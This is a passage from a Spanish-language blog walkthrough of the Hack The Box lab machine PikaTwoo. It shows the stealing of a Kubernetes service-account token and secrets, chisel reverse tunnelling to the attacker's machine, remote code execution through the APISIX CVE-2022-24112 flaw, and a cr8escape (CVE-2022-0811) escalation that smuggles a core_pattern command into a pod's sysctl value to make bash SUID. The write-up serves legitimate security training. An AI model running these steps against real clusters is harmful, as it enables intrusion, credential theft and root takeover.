<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>APISERVER<span style="color:#f92672">=</span>https://kubernetes.default.svc
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SERVICEACCOUNT<span style="color:#f92672">=</span>/var/run/secrets/kubernetes.io/serviceaccount
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NAMESPACE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">${</span>SERVICEACCOUNT<span style="color:#e6db74">}</span>/namespace<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">${</span>SERVICEACCOUNT<span style="color:#e6db74">}</span>/token<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CACERT<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>SERVICEACCOUNT<span style="color:#e6db74">}</span>/ca.crt
</span></span></code></pre></div><p>Ahora podemos hacer un curl a la api con el token que tenemos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ curl --cacert <span style="color:#e6db74">${</span>CACERT<span style="color:#e6db74">}</span> --header <span style="color:#e6db74">&#34;Authorization: Bearer </span><span style="color:#e6db74">${</span>TOKEN<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> -X GET <span style="color:#e6db74">${</span>APISERVER<span style="color:#e6db74">}</span>/api ; echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;kind&#34;</span>: <span style="color:#e6db74">&#34;APIVersions&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;versions&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;v1&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;serverAddressByClientCIDRs&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;clientCIDR&#34;</span>: <span style="color:#e6db74">&#34;0.0.0.0/0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;serverAddress&#34;</span>: <span style="color:#e6db74">&#34;192.168.49.2:8443&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>También podemos listar los secretos de la pagina</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --cacert <span style="color:#e6db74">${</span>CACERT<span style="color:#e6db74">}</span> --header <span style="color:#e6db74">&#34;Authorization: Bearer </span><span style="color:#e6db74">${</span>TOKEN<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> -X GET <span style="color:#e6db74">${</span>APISERVER<span style="color:#e6db74">}</span>/api/v1/namespaces/$NAMESPACE/secrets
</span></span></code></pre></div><p>Esto nos dará dos keys</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;APISIX_ADMIN_KEY&#34;</span>: <span style="color:#e6db74">&#34;YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;APISIX_VIEWER_KEY&#34;</span>: <span style="color:#e6db74">&#34;OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg=&#34;</span>
</span></span></code></pre></div><p>Gracias a todo esto, y a esta vulnerabilidad del <code>APISIX</code>, seremos capaces de ejecutar comandos</p>
<p>CVE &ndash;&gt; <a href="https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/">https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/</a></p>
<p>Nos pasamos el chisel a la maquina victima y ejecutamos este comando en nuestra maquina (este proceso que vamos a hacer ahora es para poder ver la peticion en <code>burpsuite</code>, te lo puedes saltar si lo hacer solo con curl)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server --reverse --port <span style="color:#ae81ff">8081</span>
</span></span></code></pre></div><p>ahora comprobamos que el puerto 9080 sea el de apisix-admin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ curl apisix-admin:9080 -v
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*   Trying 10.98.202.103:9080...
</span></span><span style="display:flex;"><span>* Connected to apisix-admin <span style="color:#f92672">(</span>10.98.202.103<span style="color:#f92672">)</span> port <span style="color:#ae81ff">9080</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
</span></span><span style="display:flex;"><span>&gt; GET / HTTP/1.1
</span></span><span style="display:flex;"><span>&gt; Host: apisix-admin:9080
</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.74.0
</span></span><span style="display:flex;"><span>&gt; Accept: */*
</span></span><span style="display:flex;"><span>&gt; 
</span></span><span style="display:flex;"><span>* Mark bundle as not supporting multiuse
</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
</span></span><span style="display:flex;"><span>&lt; Date: Fri, <span style="color:#ae81ff">13</span> Oct <span style="color:#ae81ff">2023</span> 23:27:37 GMT
</span></span><span style="display:flex;"><span>&lt; Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>&lt; Transfer-Encoding: chunked
</span></span><span style="display:flex;"><span>&lt; Connection: keep-alive
</span></span><span style="display:flex;"><span>&lt; Server: APISIX/2.10.1
</span></span><span style="display:flex;"><span>&lt; 
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;error_msg&#34;</span>:<span style="color:#e6db74">&#34;404 Route Not Found&#34;</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host apisix-admin left intact</span>
</span></span></code></pre></div><p>viendo que es el puerto 9080 escribimos este comando en la maquina victima</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel client 10.10.14.7:8081 R:9080:apisix-admin:9080
</span></span></code></pre></div><p>Ahora tenemos hecho el port forwarding de ese Puerto a nuestra maquina, por lo que si hacemos un curl a este puerto tendremos respuesta</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ curl localhost:9080
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;error_msg&#34;</span>:<span style="color:#e6db74">&#34;404 Route Not Found&#34;</span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Todo esto es para poder usar el burpsuite, y que sea mas fácil mandar la peticion para el <code>RCE</code>, ahora desde burpsuite vamos a andar una peticion basada en esta pagina</p>
<p>Pagina &ndash;&gt; <a href="https://apisix.apache.org/docs/apisix/plugins/batch-requests/">https://apisix.apache.org/docs/apisix/plugins/batch-requests/</a></p>
<p>Vamos a usar esto para crear un archivo que contenga una reverse shell, para conectarnos con la maquina principal, la peticion seria esta:</p>
<p><img src="/htb/PikaTwoo/images/45.png" alt="Pika"></p>
<p>Ahora hacemos un curl a esta nueva pagina que hemos creado, y nos ponemos en escucha, para verificar si nos hace una peticion</p>
<p><img src="/htb/PikaTwoo/images/46.png" alt="Pika"></p>
<p>Y recibimos la peticion, perfecto ahora podemos empezar a crear la peticion para la reverse shell, para esto usaremos un comando filter, el cual nos dejara ejecutar comandos en <code>lua</code>, para posteriormente indicarle de ejecutarlos en shell</p>
<p><img src="/htb/PikaTwoo/images/47.png" alt="Pika"></p>
<p>Una vez creada nos ponemos por escucha y le hacemos un curl a esta nueva pagina</p>
<p><img src="/htb/PikaTwoo/images/48.png" alt="Pika"></p>
<p>Ahora dentro, si nos ponemos a buscar credenciales veremos un config.yaml, el cual contiene las credenciales ssh de <code>Andrew</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/local/apisix/conf/config.yaml
</span></span></code></pre></div><p><img src="/htb/PikaTwoo/images/49.png" alt="Pika"></p>
<p>Ahora podemos conectarnos con ssh con estas credenciales y obtener la user.txt</p>
<p><img src="/htb/PikaTwoo/images/50.png" alt="Pika"></p>
<h2 id="privesc">Escalada de privilegios</h2>
<p>Ahora empieza la escalada de privilegios, podemos ver que en el /home hay otro usuario llamado <code>Jennifer</code> y en su home hay un archivo template.yaml</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat template.yaml 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>apiVersion: v1
</span></span><span style="display:flex;"><span>kind: Pod
</span></span><span style="display:flex;"><span>metadata:
</span></span><span style="display:flex;"><span>  name: template-pod
</span></span><span style="display:flex;"><span>spec:
</span></span><span style="display:flex;"><span>  containers:
</span></span><span style="display:flex;"><span>  - name: alpine
</span></span><span style="display:flex;"><span>    image: alpine:latest
</span></span><span style="display:flex;"><span>    imagePullPolicy: Never
</span></span></code></pre></div><p>También dentro de esta misma carpeta hay un .kube (lo cual nos da a saber que esta usando un <code>Kubernetes</code>) y dentro de este un config</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat config
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>apiVersion: v1
</span></span><span style="display:flex;"><span>clusters:
</span></span><span style="display:flex;"><span>- cluster:
</span></span><span style="display:flex;"><span>    certificate-authority: /home/jennifer/.minikube/ca.crt
</span></span><span style="display:flex;"><span>    extensions:
</span></span><span style="display:flex;"><span>    - extension:
</span></span><span style="display:flex;"><span>        last-update: Fri, <span style="color:#ae81ff">18</span> Mar <span style="color:#ae81ff">2022</span> 10:23:04 GMT
</span></span><span style="display:flex;"><span>        provider: minikube.sigs.k8s.io
</span></span><span style="display:flex;"><span>        version: v1.25.2
</span></span><span style="display:flex;"><span>      name: cluster_info
</span></span><span style="display:flex;"><span>    server: https://192.168.49.2:8443
</span></span><span style="display:flex;"><span>  name: minikube
</span></span><span style="display:flex;"><span>contexts:
</span></span><span style="display:flex;"><span>- context:
</span></span><span style="display:flex;"><span>    cluster: minikube
</span></span><span style="display:flex;"><span>    user: jennifer
</span></span><span style="display:flex;"><span>  name: jennifer-context
</span></span><span style="display:flex;"><span>current-context: jennifer-context
</span></span><span style="display:flex;"><span>kind: Config
</span></span><span style="display:flex;"><span>preferences: <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>users:
</span></span><span style="display:flex;"><span>- name: jennifer
</span></span><span style="display:flex;"><span>  user:
</span></span><span style="display:flex;"><span>    client-certificate: /home/jennifer/.minikube/profiles/minikube/jennifer.crt
</span></span><span style="display:flex;"><span>    client-key: /home/jennifer/.minikube/profiles/minikube/jennifer.key
</span></span></code></pre></div><p>Podemos listar los <code>namespaces</code> de este config</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ kubectl --kubeconfig /home/jennifer/.kube/config get namespaces
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NAME              STATUS   AGE
</span></span><span style="display:flex;"><span>applications      Active   575d
</span></span><span style="display:flex;"><span>default           Active   575d
</span></span><span style="display:flex;"><span>development       Active   337d
</span></span><span style="display:flex;"><span>kube-node-lease   Active   575d
</span></span><span style="display:flex;"><span>kube-public       Active   575d
</span></span><span style="display:flex;"><span>kube-system       Active   575d
</span></span></code></pre></div><p>Viendo que tenemos el config y el template.yaml podemos probar a crear un <code>pod</code> usando los namespaces que hemos listado antes (en mi caso me funciono con development)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ kubectl --kubeconfig /home/jennifer/.kube/config create -f template.yaml -n development
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pod/template-pod created
</span></span></code></pre></div><p>Podemos intentar listar los <code>pods</code> que hay en development, pero no nos dejara</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --kubeconfig /home/jennifer/.kube/config get pods -n development
</span></span></code></pre></div><p>Si grepeamos por crio podemos ver la version de <code>Kubernetes</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ grep -R crio
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>APIServerPort:8443 KubernetesVersion:v1.23.3
</span></span></code></pre></div><p>Esta version tiene una vulnerabilidad bastante reciente</p>
<p>CVE &ndash;&gt; <a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/</a></p>
<p>Básicamente lo que nos dice esto es que todos los procesos de <code>Kubernetes</code> usan el mismo <code>kernel</code>, por lo que nos podemos aprovechar para inyectar comandos, primero vamos a irnos al /dev/shm (porque el /tmp se borra cada cierto tiempo), y vamos a crear dos archivos.</p>
<p>Uno llamado shell.sh el cual tendrá el comando que queremos ejecutar como root</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>chmod +s /bin/bash
</span></span></code></pre></div><p>Y ahora crearemos el .yaml malicioso, que nos ejecutara el script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apiVersion: v1
</span></span><span style="display:flex;"><span>kind: Pod
</span></span><span style="display:flex;"><span>metadata:
</span></span><span style="display:flex;"><span>  name: sysctl-set
</span></span><span style="display:flex;"><span>spec:
</span></span><span style="display:flex;"><span>  securityContext:
</span></span><span style="display:flex;"><span>   sysctls:
</span></span><span style="display:flex;"><span>   - name: kernel.shm_rmid_forced
</span></span><span style="display:flex;"><span>     value: <span style="color:#e6db74">&#34;1+kernel.core_pattern=|/dev/shm/shell.sh #&#34;</span>
</span></span><span style="display:flex;"><span>  containers:
</span></span><span style="display:flex;"><span>  - name: alpine
</span></span><span style="display:flex;"><span>    image: alpine:latest
</span></span><span style="display:flex;"><span>    command: <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;tail&#34;</span>, <span style="color:#e6db74">&#34;-f&#34;</span>, <span style="color:#e6db74">&#34;/dev/null&#34;</span><span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Ahora creamos el &ldquo;pod&rdquo; con este .yaml</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --kubeconfig /home/jennifer/.kube/config create -f malicius.yaml -n development
</span></span></code></pre></div><p>Si listamos los procesos del <code>kernel</code> veremos nuestro comando a la espera de ejecutarse</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat /proc/sys/kernel/core_pattern 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/dev/shm/shell.sh <span style="color:#75715e">#&#39;</span>
</span></span></code></pre></div><p>Y deslimitamos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ulimit -c unlimited
</span></span></code></pre></div><p>Ahora que todo esta listo, lo ejecutamos de esta manera, creamos un proceso en <code>segundo plano</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tail -f /dev/null &amp;
</span></span></code></pre></div><p>Final mente matamos este nuevo proceso de esta manera</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kill -SIGSEGV <span style="color:#ae81ff">1086444</span>
</span></span></code></pre></div><p>Y tendremos la bash con <code>SUID</code></p>
<p><img src="/htb/PikaTwoo/images/51.png" alt="Pika"></p>
<p>Ahora nos vamos al /root y visualizamos la root.txt ; )</p>

    </section>
</article>
<br>
<br>
<section class="read-more">
    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/hmv/slowman/slowman/" title="link to HMVM - Slowman">HMVM - Slowman</a></h2>
        <p class="excerpt">Resolución de la maquina Slowman - Easy</p>
        <div class="post-list__meta">
            <time datetime=" 2023-09-13 07:28:17 &#43;0800" class="post-list__meta--date date">2023-11-13</time>
             <span class="post-list__meta--tags tags">   • <a href="https://rug4lo.github.io/tags/bruteforce">Bruteforce</a>   • <a href="https://rug4lo.github.io/tags/capabilitie-exploitation">Capabilitie exploitation</a>  </span> 
        </div>
    </div>
    


    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/htb/2023/07/htb-bankrobber/" title="link to HTB - Bankrobber">HTB - Bankrobber</a></h2>
        <p class="excerpt">Resolucion de la maquina Bankrobber - Insane</p>
        <div class="post-list__meta">
            <time datetime=" 2023-09-13 07:28:17 &#43;0800" class="post-list__meta--date date">2023-07-04</time>
             
            <span class="post-list__meta--tags tags"> 
                  • <a href="https://rug4lo.github.io/tags/blind-xss-injection">Blind XSS Injection</a>   • <a href="https://rug4lo.github.io/tags/cookie-hijacking">Cookie hijacking</a>   • <a href="https://rug4lo.github.io/tags/sqli">SQLI</a>   • <a href="https://rug4lo.github.io/tags/stealing-net-ntlmv2-hash">Stealing Net-NTLMv2 Hash</a>   • <a href="https://rug4lo.github.io/tags/rce">RCE</a>   • <a href="https://rug4lo.github.io/tags/abusing-a-custom-binary">Abusing a custom binary</a>  
            </span>
            
        </div>
    </div>
    
 </section>
  
<br>

        <section class="footer">
    <footer>
        <span class="footer__copyright"> © 2024 - Rug4lo </span>
    </footer>
</section>

    </div>
  </div>

  <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script><script>
    (function(i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function() {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'your_ga_id', 'your_host');
    ga('send', 'pageview');
</script>


</body>

